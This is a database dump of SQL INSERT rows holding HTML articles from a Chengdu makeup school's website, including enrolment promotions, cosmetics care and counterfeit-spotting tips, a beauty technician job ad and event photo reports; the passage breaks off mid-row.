INSERT INTO dede_addonarticle VALUES ('82', '17', '<span style=\"font-size: 24px;\">&nbsp; <span style=\"color:#000000;\"><strong>群丽化妆学校（教育机构认证单位）</strong></span><span style=\"color:#ff0000;\"><strong>入学即签就业合同</strong>。</span></span>\r\n<h4 style=\"color: red;\">\r\n	<span style=\"font-size: 24px;\"><span style=\"color:#000000;\">&nbsp;<span dir=\"ltr\"> 多年的教学经验，师资优秀、专业的设备教学，完善的教学课程、环境高端优雅、设备先进、教风严谨、在成都享有名誉。</span></span></span></h4>\r\n<span style=\"font-size: 24px;\"><span style=\"color:#000000;\">&nbsp;</span></span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size: 24px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G456103Z.jpg\" /></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size: 24px;\"><span style=\"color: rgb(255, 0, 0);\"><span style=\"font-size: 48px;\">现四月火爆招生正在进行中</span></span></span></div>\r\n<span style=\"font-size: 24px;\">&nbsp;</span>\r\n<p style=\"text-align: center;\">\r\n	<span style=\"background-color:yellow;\"><span style=\"font-size:36px;\"><span style=\"color:#000000;\"><strong>专业班<br />\r\n	报名既送价值1380元全套化妆品<br />\r\n	特色：&nbsp;专业讲师全程手把手辅导，针对个人量身打造专属彩妆造型&nbsp;</strong></span></span></span><br />\r\n	&nbsp;</p>\r\n<p style=\"text-align: center;\">\r\n	<span style=\"font-size: 24px;\"><span style=\"font-size: 28px;\"><span style=\"background-color:yellow;\"><span style=\"font-size:36px;\"><span style=\"color:#000000;\"><strong>自我化妆班<br />\r\n	特色：两人同行，一人免费。无需整形，只需680元</strong></span></span></span></span></span></p>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size: 24px;\"><span style=\"font-size: 28px;\">&nbsp;</span></span></div>\r\n<span style=\"font-size: 24px;\">&nbsp;</span>', '', '', '182.151.165.30');
INSERT INTO dede_addonarticle VALUES ('86', '18', '<span style=\"font-size:24px;\">&nbsp; <span style=\"color:#000000;\">迅速发展中的中国，人们对自身美的需求也逐日增高。随即在国内诞生的影楼、影视基地、艺术公司等的职位也开始了大量招聘。<br />\r\n那么就以化妆师这职位来说，在公司大量需求的前提下，常常会遇见&ldquo;招聘助理&rdquo;这一信息。那么我们就邀请了一位在艺术公司从事多年的化妆师站在中肯的立场上阐述下助理与学校的劣势与优势。</span></span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"color: rgb(0, 0, 0); font-size: 36px; text-align: center;\">A、影楼助理优势</span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><span style=\"font-size:28px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G6410O20.jpg\" /></span></span></div>\r\n<span style=\"font-size:24px;\">&nbsp;&nbsp;一、有薪资，相比学校来说免去了学习费用<br />\r\n&nbsp;&nbsp;二、实践操作、因为在影楼里遇见的都是客户。所以对于在影楼学习的人来说，是更有针对性和实际操作性的。<br />\r\n&nbsp;&nbsp;三、培养化妆技能及影楼式销售。</span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"color: rgb(0, 0, 0); font-size: 36px; text-align: center;\">B、影楼助理劣势</span></div>\r\n<span style=\"color:#000000;\"><span style=\"font-size:24px;\">&nbsp;&nbsp;一、影楼工作压力大，对于在影楼教导你的老师来说。更多的时间她是在照顾顾客。很多问题需要你去问及头脑灵活。<br />\r\n&nbsp;&nbsp;二、影楼教导你的化妆师没有收取你的学习费用，所以自然而然不会对你负责。也不会主动教导你，全靠自学及问问题。而同时如果自己没有一些基础知识那才是最困难的。<br />\r\n&nbsp;&nbsp;三、不要认为只要从事化妆师，那么自己的责任就只是化妆。在现在竞争力大的影楼市场，有些影楼对技术并不是很在意，因为在你掌握了基础知识后，后期学习是很简单的。所以影楼会优先培训你的销售技能。</span></span><br />\r\n<div style=\"text-align: center;\">\r\n	<span style=\"color: rgb(0, 0, 0); font-size: 36px; text-align: center;\">C、学校系统化优势</span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><span style=\"font-size:28px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G64133927.jpg\" style=\"width: 391px; height: 220px;\" /></span></span></div>\r\n<span style=\"font-size:24px;\">&nbsp; <span style=\"color:#000000;\">一、老师有多年教学经验，能够很好的全方面教导知识面。<br />\r\n&nbsp; 二、学校老师会对你更具有耐心，并做到一对一的教导式。相比外面来说，更全面更仔细。<br />\r\n&nbsp; 三、因为在外面单位的冲击下，学校更会加强实践操作方面。<br />\r\n&nbsp; 四、学习的流程包括初级、中级、高级整体形象四大板块。主要加强基础知识。对后期自我提高有很大的帮助。</span></span><br />\r\n<div style=\"text-align: center;\">\r\n	<span style=\"color: rgb(0, 0, 0); font-size: 36px; text-align: center;\">&nbsp;D、去学校劣势</span></div>\r\n<span style=\"color:#000000;\"><span style=\"font-size:24px;\">&nbsp; 一、去学校会收取学费<br />\r\n&nbsp; 二、相比单位的长远培养，学校主要教学在于技能的使用。<br />\r\n&nbsp; 三、学校对于外面来说，针对客人的销售技巧较少。<br />\r\n&nbsp; 针对以上的分析之后，我相信大家对是选择影楼还是学校已经有个一定的认识了。<br />\r\n&nbsp;&nbsp;&nbsp;<br />\r\n&nbsp; 成都群丽化妆学校经过多年的沉淀，教学经验丰富，在化妆、美容。美甲、美发方面更开拓出了自身独有的教学方式及理念。在整个教学过程中采用&ldquo;理论&rdquo;与&ldquo;实践&rdquo;相结合。同时在教学规划上聘请国内知名时尚业授课导师，奉承让每位学员在理论中结合实践，从而提高专业的实质升华。<br />\r\n&nbsp;<br />\r\n&nbsp; &nbsp;</span></span><br />\r\n', '', '', '222.211.124.86');
INSERT INTO dede_addonarticle VALUES ('87', '18', '<span style=\"font-size:24px;\">&nbsp; <span style=\"color:#000000;\">15日韩国税务厅发布3月出口贸易数据，其中韩国3月化妆品额为3.7746亿元。同时也是关税厅自2000年1月开始公布相关统计数据的最大值。<br />\r\n&nbsp; 同时，韩国化妆品贸易从去年5月转为顺差后，直到今年的3月一直顺差。其中中国大陆金额达到1.1889亿美元。其次是香港、美国、台湾和日本。</span></span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\">&nbsp;&nbsp;<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G64923155.jpg\" /><br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G6493S30.jpg\" /></span></div>\r\n<span style=\"font-size:24px;\">&nbsp; 据了解，化妆品以前在韩国曾一度被视为韩国的内需产业，但随着韩国文化的流行。化妆产业也变成了贸易收支的新产业。</span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G6495X63.jpg\" /></span></div>\r\n<br />\r\n', '', '', '222.211.124.86');
INSERT INTO dede_addonarticle VALUES ('90', '18', '<div>\r\n	<span style=\"font-size:24px;\">&nbsp; 随着社会的高速发展，人们对外表的需求日渐增高。而化妆品、护肤类产品更成了市场类的宠儿。<br />\r\n	&nbsp; 但国内部分生产厂也正看中了这点所以节约成本而在化妆品中使用重金属物质。而重金属物质更会危害造血系统、神经系统、肾脏、胃肠道、生殖功能、心血管、免疫与内分泌系统，特别是影响胎儿的健康等。<br />\r\n	&nbsp; 所以在现如今化妆品琳琅满足、鱼龙混杂的市场。我们更应该学会如何去辨别化妆产品。从而对虚假类产品说不。</span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:28px;\">&nbsp; 第一、拒绝从微商、QQ和没有安全信任类网络购买<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041GAG4192.jpg\" style=\"width: 320px; height: 320px;\" /></span></div>\r\n<div>\r\n	<span style=\"font-size:24px;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在网购上应选择安全信誉有保证的网络销售平台购买。微商产品如果走淘宝路线或JD路线则稍微可以考虑。但切不可被他们的妙语连珠而忽悠过去。</span><br />\r\n	&nbsp;</div>\r\n<div style=\"text-align: center;\">\r\n	&nbsp; <span style=\"font-size:28px;\">第二、看包装<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041GA925925.jpg\" /></span></div>\r\n<div>\r\n	<span style=\"font-size:24px;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;正品外包装精美、盒面光滑、烫金字体工整、清晰。而仿货外包装印刷粗糙，色泽不正，字体不清。</span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:28px;\">第三、闻<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041GF0392L.jpg\" style=\"width: 651px; height: 1000px;\" /></span></div>\r\n<div>\r\n	<span style=\"font-size:24px;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;正品香味雅致、淡雅。而仿货沉闷、浓郁、化学气息沉重。</span><br />\r\n	&nbsp;</div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:28px;\">第四、条码<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041GF140V0.jpg\" style=\"width: 499px; height: 220px;\" /></span></div>\r\n<div>\r\n	<span style=\"font-size:24px;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一种型号的化妆品只有一个条码，而完整条码是在生产商那里。如果你下次还要买一样的化妆品。不妨把之前用过的产品条码保留下来，以便对照。完全匹配那便是正品。<br />\r\n	第五、价格<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;实体店的进货渠道来商家，而进货渠道则又决定了销售价格，再加上柜台各种费用，所以价格偏高。<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;而网络由于节省了许多实体店费用，所以拒绝讲价，并且价格较低。</span></div>\r\n', '', '', '222.211.124.86');
INSERT INTO dede_addonarticle VALUES ('91', '18', '<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\">&nbsp; 再不疯狂我们就老了。</span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041GG0095L.jpg\" style=\"width: 500px; height: 347px;\" /></span></div>\r\n<span style=\"font-size:24px;\">&nbsp; 这句话在前几年异样流行，但是殊不知这个疯狂也是要有正规的作息时间的。不然混乱的作息时间不光会损伤我们的身体，还会更肌肤带来沉重的打击。</span><br />\r\n<br />\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><span style=\"font-size:28px;\">&nbsp; 比如青春痘</span></span></div>\r\n<span style=\"font-size:24px;\">&nbsp; 对付青春痘的方法在现如今网络横行的年代，可谓是佛说佛有理。有时候我们看多了反而还会出现不知所措的局面发生。<br />\r\n&nbsp; 小编当时也是这么经历过来的，最后总觉得不靠谱。从而拜访了群丽学校的化妆老师。心想化妆老师应该对肌肤的护理和造型必定有很深的研究。不然如何教导学生了是不。<br />\r\n&nbsp; 所以这里小编就分享下群丽化妆学校化妆老师给我的锦囊妙计。望可以帮助到正为青春痘而苦恼的同学们。</span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><span style=\"font-size:28px;\">&nbsp; 第一、注意个人卫生和正当的作息时间<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041GG1305L.jpg\" /></span></span></div>\r\n<span style=\"font-size:24px;\">&nbsp; 很多化妆老师及中医在这个万花绽放的时代，尤其是当初请教群丽化妆老师时，老师也严肃的告诉我一定要有正规的作息时间和个人卫生。原因无非就是，身体一切乃健康之本，当你的身体出现病状时，脸部就会第一时间反应出来。所以中医就有了一个&ldquo;望&rdquo;的诊断方法。所以同学们第一条 &nbsp; 就一定要注意作息时间及个人卫生方面。</span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><span style=\"font-size:28px;\">&nbsp; 第二、少用刺激类产品<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041GG63N57.jpg\" style=\"width: 800px; height: 600px;\" /></span></span><br />\r\n	&nbsp;</div>\r\n<div>\r\n	<span style=\"color:#000000;\"><span style=\"font-size:24px;\">&nbsp; &nbsp;鱼龙混杂的护肤品横行网购市场，所以别贪便宜，毕竟315上京东上都出现了假冒伪劣产品。 &nbsp; &nbsp; &nbsp; &nbsp;同时群丽化妆老师在知道我有网购的毛病后，恨铁不成钢的警告我，网购护肤产品最好不要有这方面的想法。</span></span></div>\r\n<span style=\"color:#000000;\"><span style=\"font-size:24px;\">&nbsp; &nbsp;同时，定型水这些也少用。如果一定要用尽量不要沾染皮肤。</span></span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><span style=\"font-size:28px;\">第三、防晒措施<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041GGG64I.jpg\" style=\"width: 335px; height: 220px;\" /></span></span></div>\r\n<span style=\"font-size:24px;\">&nbsp; 马上夏季就紧跟随着到来，所以出门一定要做好防晒措施。不然在紫外线的直射下会形成黑色斑点，而当你青春痘消失后，黑色斑点是不会消失的。<br />\r\n第四、不要去挤青春痘，就算你看它很讨厌，也不是它的错</span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\">&nbsp; &nbsp; &nbsp;第四、别手痒<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041GGQ3R1.jpg\" style=\"width: 331px; height: 220px;\" /></span></div>\r\n<span style=\"font-size:24px;\">&nbsp; 每当我们照镜子或者要自拍几张的时候，正处青春期的你看见脸上的青春痘。总会有手痒痒的时候。这是千万不要一时手痒，而做出要等两年后色斑才会消失的错举。</span><br />\r\n<br />\r\n', '', '', '222.211.124.86');
INSERT INTO dede_addonarticle VALUES ('98', '18', '<span style=\"font-size:24px;\">&nbsp; 说道放冰箱保鲜我们肯定会脱口而出，水果蔬菜饮料等。尤其是在夏季放一些水果进冰箱，那种感觉绝对是透心凉、心飞扬。<br />\r\n&nbsp; 然而其实不光这些可以放冰箱里，化妆品也可以放冰箱里哦。<br />\r\n&nbsp; 是不是有种猜到了开始没猜到结局的感觉？<br />\r\n&nbsp; 但是呢，化妆品虽然可以保鲜。但也是要分类的。并不是所有化妆品都可以放冰箱里保鲜哦。那么接下来我就给大家分类下，那些化妆品可以放那些又不能放。</span><br />\r\n<br />\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><span style=\"font-size:28px;\">A：不能放的护肤品</span><br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150418/1-15041Q329592L.png\" style=\"width: 498px; height: 372px;\" /></span></div>\r\n<div>\r\n	<span style=\"font-size:24px;\">&nbsp; 一、润肤油、美发油这些是不能放的，放了会失去功效。<br />\r\n	&nbsp; 二、膏霜和水混合产品<br />\r\n	&nbsp; 此类产品放置冰箱内，会导致产品会出现分层。并且温差的变化也容易导致变质。</span><br />\r\n	&nbsp;</div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:28px;\">B：建议放冰箱的产品</span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><img alt=\"\" src=\"/uploads/allimg/150418/1-15041Q332325c.png\" /></span></div>\r\n<div>\r\n	<span style=\"font-size:24px;\">&nbsp; 一、眼霜和精华<br />\r\n	&nbsp; 冷空气会让眼部精华变得更加酷爽。在夏天放置冰箱里一段时间，然后涂在眼部上就会获得更佳的冰霜体验。<br />\r\n	&nbsp; 二、眼线笔<br />\r\n	&nbsp; 炎热的夏季，眼线笔的笔头很容易四周炎热的温度逼近而变软。如果把眼线笔放置冰箱几分钟，笔头就会变得坚硬许多，更加灵敏。<br />\r\n	&nbsp; 三、化妆水<br />\r\n	&nbsp; 化妆水放置冰箱，会有冰镇舒缓的效果。<br />\r\n	&nbsp; 四、面膜<br />\r\n	&nbsp; 夏天将面膜经过冰镇后，更可以舒缓晒后的肌肤。甚至晒伤的皮肤也会得到缓解</span></div>\r\n<div style=\"text-align: center;\">\r\n	&nbsp;</div>\r\n', '', '', '222.211.124.86');
INSERT INTO dede_addonarticle VALUES ('99', '40', '<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">一、应聘要求：</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">1．女性；</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">2．成熟的从业经验，（有专业证书者优先考虑）；美甲会常用技术（光疗水晶的延长，雕花，绘画功底.&nbsp;精通基础美甲-涂甲油胶、贴片）或眼睫毛护理和嫁接技巧（单根专业嫁接，自然型的睫毛双眼120根，时间控制在1.5小时。最好是双手嫁接）；</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">3.&nbsp;普通话标准，形象气质佳，善面，会微笑；</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">4.&nbsp;性格外向，工作细致，责任心强，；</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">5.&nbsp;有服务意识，擅长沟通；</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">6．年龄不低于20~30岁；</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">7．身体健康无疾病。</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">二、工作地点</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">1．领事馆路9号保利中心D座</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">2．大慈寺路IFS国金中心</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">三、岗位职责：</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">1．负责为顾客提供美甲、美婕服务。</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">四、工作时间：8小时工作，1小时用餐，每周轮休固定的一天；</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">五、薪资待遇：</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">1．试用期一个月，薪酬面议。</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">2．试用期满经考核转正，转正后薪酬面议。有年终奖金，根据本年度该员工的表现定。完成当月店铺任务有额外奖金。</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">3．转正半年后，五险一金按每月补助300元发。</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">六、公司不提供食宿。</span><br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<br style=\"color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\" />\r\n<span style=\"margin: 0px; padding: 0px; border: none; color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px;\">招聘电话：18080912802<br />\r\n<br />\r\n招聘qq:512879853@qq.com<br />\r\n<br />\r\n联系人：邱先生&nbsp;</span>', '', '', '110.184.180.134');
INSERT INTO dede_addonarticle VALUES ('110', '16', '<div style=\"text-align: center;\">\r\n	<span style=\"font-size:14px;\"><span style=\"font-size:24px;\">&nbsp; 2月27日群丽学校新学员学习现场。</span></span></div>\r\n<br />\r\n<br />\r\n<div style=\"text-align: center;\">\r\n	<br />\r\n	&nbsp;&nbsp;<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150505/1-1505051442005X.jpg\" style=\"width: 460px; height: 440px;\" /><br />\r\n	<br />\r\n	&nbsp;</div>\r\n<div>\r\n	<span style=\"font-size:24px;\">&nbsp; 这是2015年新学员在叶老师的带领下亲自示范、讲解场面。整个讲解过程中，学员细心的听叶老师在化妆造型过程中容易忽视到的细节及职场经验。</span></div>\r\n<div style=\"text-align: center;\">\r\n	&nbsp;<br />\r\n	<br />\r\n	<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150505/1-150505141123394.jpg\" style=\"width: 460px; height: 440px;\" /><br />\r\n	&nbsp;</div>\r\n<div>\r\n	&nbsp;<br />\r\n	&nbsp;<span style=\"font-size:24px;\"> 群丽化妆学校倡导实践加理论为主方针相结合。同时在教学规划上聘请国内知名时尚业授课导师，奉承让每位学员在理论中结合实践，从而提高专业的实质升华。<br />\r\n	&nbsp;&nbsp;</span></div>\r\n', '', '', '125.69.6.7');
INSERT INTO dede_addonarticle VALUES ('111', '16', '<span style=\"font-size: 20px;\">&nbsp; 2015年4月11日，在大家的期待声中，百盛集团特约商业联盟大型签约仪式正式落户于成都。<br />\r\n&nbsp; 而同时作为四川最具影响力的群丽集团也被邀请为这次签约仪式指定化妆单位。</span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size: 20px;\"><img alt=\"\" src=\"/uploads/allimg/150504/1-15050412550JC.png\" style=\"width: 380px; height: 229px;\" /></span></div>\r\n<div style=\"text-align: center;\">\r\n	&nbsp;</div>\r\n<span style=\"font-size: 20px;\">&nbsp; 群丽化妆建于1996年，位于成都市锦江区，从建学初就投资雄厚资金并且在多年的化妆教育中向社会输出高端人才近万名，多年教育经验，在成都时尚教育领域里依然屹立于教育领域中前三名。<br />\r\n&nbsp; 那么秉承着以人为本、人性教育的群丽化妆学校的学员成绩效果又是如何呢？<br />\r\n&nbsp; 那接下来就跟着小编的镜头转向群丽化妆学员为礼仪、模特呈现出精彩妆容的幕后花絮吧。</span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size: 20px;\"><img alt=\"\" src=\"/uploads/allimg/150504/1-150504125536147.png\" /></span><br />\r\n	<br />\r\n	<br />\r\n	&nbsp;</div>\r\n<div>\r\n	<span style=\"font-size: 20px;\">&nbsp; 这是0227期化妆学员为礼仪上妆中。<br />\r\n	&nbsp; 一大早群丽化妆学员就到了化妆后台，拍摄学员化妆过程中，报以认真、一丝不苟的职业精神。小编能感觉到礼仪、模特人员对学员的满意程度。我想对于检验一个化妆师的满意程度，莫过于接受化妆师的装扮吧。</span><br />\r\n	<br />\r\n	&nbsp;</div>\r\n<div style=\"text-align: center;\">\r\n	<img alt=\"\" src=\"/uploads/allimg/150504/1-150504125I0948.png\" style=\"width: 380px; height: 520px;\" /></div>\r\n<div>\r\n	<span style=\"font-size: 20px;\">&nbsp; 在进行了约2小时候，礼仪、模特终于向期待已久的观众亮相。<br />\r\n	&nbsp; 礼仪们带着和蔼可亲的笑容为在场人员呈现出温柔的心灵温暖。<br />\r\n	&nbsp; 而模特则身穿时尚衣着，随着动感音乐带着唯美典雅的身姿把青春热情的气息带给在场观众。</span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size: 20px;\">&nbsp;&nbsp;<img alt=\"\" src=\"/uploads/allimg/150504/1-150504125R5U6.png\" style=\"width: 380px; height: 468px;\" /><br />\r\n	<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150504/1-150504125U0611.png\" /></span><br />\r\n	<br />\r\n	<span style=\"font-size: 20px;\"><img alt=\"\" src=\"/uploads/allimg/150504/1-150504130000537.png\" style=\"width: 380px; height: 534px;\" /></span><br />\r\n	<br />\r\n	<br />\r\n	&nbsp;</div>\r\n<div>\r\n	<span style=\"font-size: 20px;\">&nbsp; 同时最后的压轴，作为这次的签约仪式的一方,百盛集团通过双方的洽谈/签约，也向大家正式宣布了百盛集团正式落户于四川。并通过这次特大签约活动为大家呈现出更加快捷的服务。</span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size: 20px;\">&nbsp;&nbsp;<img alt=\"\" src=\"/uploads/allimg/150504/1-150504130125Z8.png\" /></span><br />\r\n	<br />\r\n	&nbsp;</div>\r\n<br />\r\n', '', '', '125.69.6.7');
INSERT INTO dede_addonarticle VALUES ('122', '16', '<span style=\"font-size:20px;\">&nbsp; 2015年4月26日。群丽化妆学校导师带领着学员参加了晶晶的婚礼化妆。</span>\r\n<div style=\"text-align: center;\">\r\n	&nbsp;</div>\r\n<div style=\"text-align: center;\">\r\n	<img alt=\"\" src=\"/uploads/allimg/150509/1-150509143405Z0.jpg\" style=\"width: 553px; height: 775px;\" /></div>\r\n<div>\r\n	<span style=\"font-size:20px;\">&nbsp; 同时作为整个婚礼化妆的化妆负责：群丽化妆学校导师和学员更加在整个化妆过程中，呈现一丝不苟的专业精神。</span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:20px;\"><img alt=\"\" src=\"/uploads/allimg/150509/1-150509143515192.jpg\" style=\"width: 640px; height: 960px;\" /><br />\r\n	<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150509/1-15050914352Y10.jpg\" style=\"width: 640px; height: 960px;\" /><br />\r\n	<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150509/1-150509143541534.jpg\" style=\"width: 640px; height: 427px;\" /></span><br />\r\n	&nbsp;</div>\r\n<div>\r\n	<br />\r\n	&nbsp;</div>\r\n<p style=\"text-align: center;\">\r\n	<span style=\"font-size:20px;\">&nbsp;&nbsp;</span><br />\r\n	<br />\r\n	<br />\r\n	&nbsp;</p>\r\n', '', '', '222.211.123.68');
INSERT INTO dede_addonarticle VALUES ('124', '16', '&nbsp;&nbsp;&nbsp; <span style=\"font-size: 20px\">流金5月，群丽化妆学校杨洁老师化妆班迎来了三周以来的新学员考试。<br />\r\n&nbsp; 而这次考试的主题则是定义在现代社会中、政府机关、学校、公司等工作人员所需的职业装。<br />\r\n&nbsp; 职业装与俏皮可爱流行装相比，职业装因职业和环境的要求，在妆艳中要求成熟自信、干练爽朗。<br />\r\n&nbsp; 并且合适的职业妆容更能充分体现出一个人的美丽自信同时也会给人专业和干练的感觉。</span><br />\r\n<br />\r\n<div style=\"text-align: center\">\r\n	<span style=\"font-size: 14px\"><span style=\"font-size: 16px\"><span style=\"font-size: 20px\"><span style=\"font-size: 14px\"><img alt=\"\" src=\"/uploads/allimg/150517/1-15051G13341M2.jpg\" style=\"width: 640px; height: 960px\" /><br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150517/1-15051G1335S17.jpg\" style=\"width: 640px; height: 960px\" /><br />\r\n	<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150517/1-15051G13420b1.jpg\" style=\"width: 640px; height: 960px\" /></span></span></span></span></div>\r\n', '', '', '182.151.165.30');
INSERT INTO dede_addonarticle VALUES ('125', '16', '<h3>\r\n	<img src=\"/uploads/150518/1-15051Q252454V.jpg\" style=\"margin-right: 10px; float: left; width: 140px; height: 150px;\" /><span style=\"font-size:20px;\"><font face=\"arial\"><span style=\"line-height: 22px;\">Makeup School</span></font></span></h3>\r\n<p>\r\n	<span style=\"font-size:12px;\"><span left-pos=\"6|6\" right-pos=\"6|6\" space=\"\" style=\"color: rgb(51, 51, 51); font-family: arial; line-height: 22px;\">Ballet</span><span left-pos=\"0|6\" right-pos=\"0|6\" space=\"0| \" style=\"color: rgb(51, 51, 51); font-family: arial; line-height: 22px;\">&nbsp;Dress</span></span></p>\r\n<hr />\r\n<p>\r\n	<span style=\"color:#999999;\">&nbsp; &nbsp; &nbsp; &nbsp;<span style=\"font-family: 微软雅黑; font-size: 20px;\">整体而言，韩式新娘妆容特别在美感、发型、妆容、配饰、礼服、头纱、捧花、个人的仪态上尤为突出，同时气质均也是必须精心一番。</span></span></p>\r\n<span style=\"color:#999999;\"><span style=\"font-family: 微软雅黑; font-size: 20px;\">&nbsp; 而韩式新娘彩妆中着装重点的眼睛部分，则眼线应该尽量的靠近睫毛边缘，而眼影部分是要以眼眶为中心，逐渐的向外淡去。</span><br />\r\n&nbsp; &nbsp; &nbsp; 